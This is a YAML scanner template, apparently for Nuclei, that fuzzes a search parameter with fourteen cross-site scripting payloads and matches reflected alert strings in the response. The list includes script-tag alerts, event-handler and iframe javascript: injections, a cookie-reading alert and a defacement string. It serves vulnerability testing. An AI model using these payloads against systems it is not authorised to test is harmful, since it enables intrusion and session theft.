id: xss-testing

info:
  name: Cross-Site Scripting (XSS) Testing
  author: Amit
  severity: medium
  description: |
    This template is designed to detect XSS vulnerabilities by injecting various payloads into testable parameters and identifying reflective or executed code in the response.
  tags: xss,dast,fuzzing

http:
  - raw:
      - |
        GET /search?q=§payload§ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        Connection: close

    payloads:
      payload:
        - "<script>alert(123)</script>"
        - "<script>alert('XSS');</script>"
        - "'><script>alert('XSSed');</script>"
        - "'><script>alert(document.cookie);</script>"
        - "<body onload=alert('XSS')>"
        - "<img src=1 onerror=alert(1)>"
        - "<svg onload=alert(1)>"
        - "%3cscript%3ealert(1)%3c%2fscript%3e"
        - "<iframe src=javascript:alert(1)>"
        - "<svg xmlns='#'><script>alert(1)</script></svg>"
        - "&lt;script&gt;alert(/XSS/&#46;source)&lt;/script&gt;"
        - "<script x>alert(1)<script y>"
        - "';'><marquee><h1>Hacked</h1></marquee>"
        - "<p style=\"width: expression(alert('XSS'))\">Foobar</p>"

    attack: clusterbomb

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "alert(123)"
          - "alert(1)"
          - "XSSed"
      - type: word
        part: header
        words:
          - "text/html"
      - type: regex
        regex:
          - "(?i)<script>alert\\((.*?)\\)<\\/script>"
          - "<svg xmlns='#'><script>alert\\(1\\)</script></svg>"
